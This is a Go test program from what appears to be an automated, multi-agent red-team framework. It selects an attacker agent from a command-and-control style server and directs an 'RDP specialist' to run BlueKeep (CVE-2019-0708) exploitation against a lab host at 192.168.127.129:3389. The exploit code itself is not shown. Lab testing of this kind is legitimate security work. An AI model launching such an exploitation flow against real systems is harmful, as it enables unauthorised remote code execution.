package main

import (
	"cal-project/internal/brain/specialist"
	"cal-project/internal/core/bus"
	"cal-project/internal/hands/trt"
	"context"
	"log"
	"os"
	"time"
)

func main() {
	// Configuration
	target := "192.168.127.129"
	port := 3389
	trtURL := os.Getenv("TRT_API_URL")
	if trtURL == "" {
		trtURL = "http://localhost:8080"
	}

	log.Printf("=== BlueKeep (CVE-2019-0708) Test ===")
	log.Printf("Target: %s:%d", target, port)
	log.Printf("TRT Server: %s", trtURL)

	// Initialize TRT Client
	os.Setenv("TRT_API_URL", trtURL)
	trtClient := trt.NewClient()

	// Authenticate with TRT
	if err := trtClient.Authenticate(); err != nil {
		log.Fatalf("Failed to authenticate with TRT: %v", err)
	}
	log.Printf("TRT authentication successful")

	// Get alive agents
	agents, err := trtClient.GetAliveAgents()
	if err != nil {
		log.Fatalf("Failed to get agents: %v", err)
	}

	if len(agents) == 0 {
		log.Fatalf("No agents available")
	}

	// Find teekih agent specifically (Windows host with tunnel)
	var attackerAgent trt.Agent
	for _, a := range agents {
		if a.Paw == "teekih" {
			attackerAgent = a
			break
		}
	}
	// Fallback to first agent if teekih not found
	if attackerAgent.Paw == "" {
		attackerAgent = agents[0]
		log.Printf("WARNING: teekih agent not found, using %s instead", attackerAgent.Paw)
	}
	log.Printf("Attacker Agent: PAW=%s, Host=%s, Platform=%s, Privilege=%s",
		attackerAgent.Paw, attackerAgent.Host, attackerAgent.Platform, attackerAgent.Privilege)

	// Create Event Bus
	eventBus := bus.NewMemoryBus(100)
	eventBus.Start()
	defer eventBus.Stop()

	// Create context (2 minute timeout for Windows agent)
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer cancel()

	// Create RDP Specialist
	rdpSpec := specialist.NewRDPSpecialist(
		ctx,
		"RDPSpec-Test",
		eventBus,
		target,
		port,
		attackerAgent.Paw,
		attackerAgent.Platform,
		trtClient,
	)

	// Subscribe to events - call OnEvent handler
	eventBus.Subscribe("RDPSpec-Test", func(e bus.Event) {
		log.Printf("[EVENT] Type=%s, From=%s, To=%s, Payload=%v",
			e.Type, e.FromAgent, e.ToAgent, e.Payload)
		rdpSpec.OnEvent(e)
	})

	// Also subscribe to Commander and Reporter events
	eventBus.Subscribe("Commander-01", func(e bus.Event) {
		log.Printf("[COMMANDER EVENT] Type=%s, Payload=%v", e.Type, e.Payload)
	})
	eventBus.Subscribe("Reporter-01", func(e bus.Event) {
		log.Printf("[REPORTER EVENT] Type=%s, Payload=%v", e.Type, e.Payload)
	})

	// Run the specialist
	if err := rdpSpec.Run(); err != nil {
		log.Fatalf("RDPSpecialist failed to start: %v", err)
	}

	// Send command to start exploitation
	log.Printf("Sending exploitation command...")
	eventBus.Publish("RDPSpec-Test", bus.Event{
		Type:      bus.Command,
		FromAgent: "test",
		ToAgent:   "RDPSpec-Test",
		Payload:   "execute",
	})

	// Wait for completion (max 10 minutes)
	log.Printf("Waiting for exploitation to complete...")
	<-ctx.Done()

	log.Printf("Test completed")
}
